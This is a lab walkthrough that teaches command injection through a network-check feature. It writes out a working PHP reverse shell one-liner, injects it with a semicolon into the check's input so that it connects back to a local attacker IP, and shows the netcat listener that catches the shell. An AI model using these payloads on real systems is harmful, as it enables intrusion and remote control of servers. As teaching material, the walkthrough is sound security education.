
# 🌐 Introduction to Command Injection

---

## ❓ What is Command Injection?

Command Injection is a security vulnerability that allows an attacker to execute arbitrary commands on the host operating system via a vulnerable application.  
This vulnerability is typically found in web applications that fail to properly sanitize user inputs directly used in shell commands.

---

## 🧰 Why Use the `eval` Function as an Example?

- **Function Usage:**  
  The `eval` function in many programming languages (e.g., JavaScript, Python, PHP) evaluates or executes an argument as code.  
  If the input to `eval` is not strictly controlled, it can execute malicious code.
- **Risks:**  
  Since `eval` can execute dynamic expressions, unsanitized inputs can lead to severe security risks.

---

# 🛠️ Lab Walkthrough: Discovering Command Injection

### 1️⃣ Initial Setup:
- **Functionality Tested:**  
  Network check.
- **User Input:**  
  `http://localhost`
- **System Response:**
  ```
  Command: curl -I -s -L http://localhost | grep "HTTP/"
  Result: HTTP/1.1 200 OK
  ```

---

### 2️⃣ Exploitation Using GitHub Resources:
- **Resource:**  
  [PayloadsAllTheThings GitHub Repository](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- **Selected Payload:**  
  PHP reverse shell command.

---

### 3️⃣ Crafting the Payload:
- **Original Command:**
  ```php
  php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
  ```
- **Modified for Local Use:**  
  Replace "10.0.0.1" with the local IP obtained via `$ ip a` command.
- **Input into Network Check:**
  ```bash
  ; php -r '$sock=fsockopen("192.168.164.128",4444);exec("/bin/sh -i <&3 >&3 2>&3");'; #
  ```

---

### 4️⃣ Establishing the Reverse Shell:
- **Listening on Attacker's Machine:**
  ```bash
  nc -nlvp 4444
  ```
- **Outcome:**  
  Successful connection and control over the server's shell.

---

## 📡 What is a Reverse Shell?

A reverse shell is a type of shell where the target machine opens a connection to an attacking machine, which then has the ability to execute commands on the target machine.  
It's "reverse" because the target (not the attacker) initiates the connection and then receives commands.

---

## 🔧 Understanding the Commands:

- **`ip a` Command:**  
  Displays all network interfaces and their IP addresses.
- **`nc` Command:**  
  Netcat, a versatile networking tool for debugging and investigating networks.
- **`nlvp` Flags:**
  - `n`: Skips DNS resolution.
  - `l`: Sets up a listener.
  - `v`: Increases verbosity to show incoming connections.
  - `p`: Specifies the listening port.

---

### 🧩 How the Payload Works:
- **Payload Breakdown:**  
  - The semicolon `;` terminates any previous commands.  
  - The PHP script is then executed, creating a socket connection back to the attacker's IP and port.  
  - `exec` runs a shell binded to this socket, allowing command execution from the attacker's side.
- **Security Bypass:**  
  This payload bypasses input validation and demonstrates a command injection vulnerability.

---
